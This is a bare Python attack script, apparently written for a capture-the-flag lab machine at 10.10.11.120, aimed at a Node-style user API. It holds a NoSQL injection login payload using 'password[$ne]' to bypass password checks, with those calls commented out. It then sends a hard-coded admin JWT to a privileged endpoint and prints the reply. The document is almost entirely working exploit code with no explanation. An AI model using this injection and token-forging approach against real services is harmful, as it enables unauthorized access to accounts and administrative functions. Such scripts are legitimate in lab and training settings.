import requests
import json

urlRegister = 'http://10.10.11.120:3000/api/user/register'
urlLogin = 'http://10.10.11.120:3000/api/user/login'
urlPriv = 'http://10.10.11.120:3000/api/priv'

myObj = {"name":"adminUno","email":"nullbyte@test.com","password":"admin1234"}
#xRegister = requests.post(url, json=myObj);
#print(xRegister.text)

myObjLogin = {"email":"nullbyte@test.com","password[$ne]":"admin1234"}
#xLogin = requests.post(urlLogin, json=myObjLogin)
#print(xLogin.text)

auth = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjI4NzI3NjY5fQ.PFJldSFVDrSoJ-Pg0HOxkGjxQ69gxVO2Kjn7ozw9Crg'

m = requests.get(urlPriv, headers={'auth-token':'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjI4NzI3NjY5fQ.PFJldSFVDrSoJ-Pg0HOxkGjxQ69gxVO2Kjn7ozw9Crg'})

print(m.text)
